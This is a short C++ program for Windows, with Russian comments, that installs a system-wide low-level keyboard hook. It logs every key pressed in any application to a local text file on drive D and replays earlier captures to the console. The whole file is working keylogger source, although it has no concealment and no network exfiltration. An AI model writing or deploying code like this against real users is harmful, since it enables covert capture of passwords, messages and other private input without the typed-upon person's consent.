#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

HHOOK hHook;
// std::ofstream fout;
std::fstream fin;
bool isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}
// Функция обработки клавиатурного хука
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) { // HC_ACTION означает, что есть событие для обработки
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) { // Если клавиша нажата
            std::cout << "Key pressed: " << p->vkCode << std::endl;
            if((char)p->vkCode <= 126 && (char)p->vkCode >= 32) {
                if(!isCapsLockOn() && (char)p->vkCode <= 'Z' && (char)p->vkCode >= 'A' ) {
                    fin << (char)((char)p->vkCode+32);
                }
                else if(p->vkCode==32) {
                    fin << " ";
                }
                else {
                    fin << (char)p->vkCode;
                }
                // fin << " ";
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {

    // Устанавливаем глобальный хук клавиатуры
    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (!hHook) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    // fout.open("d:\\RecFiles\\recFile.txt");
    fin.open("d:\\RecFiles\\recFile.txt");
    if(fin) {
        std::cout<<"File is open\n";
        std::string s;
        // std::getline(fout,s);
         for(fin >> s; !fin.eof(); fin >> s)
             std::cout << s << " ";
        fin.close();
    }
    else std::cout<<"ERROR: FILE IS NOT OPEN\n";

    fin.open("d:\\RecFiles\\recFile.txt",std::ios_base::app);
    // Бесконечный цикл сообщений для сохранения хука в рабочем состоянии
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    fin.close();
    UnhookWindowsHookEx(hHook); // Убираем хук при завершении программы
    return 0;
}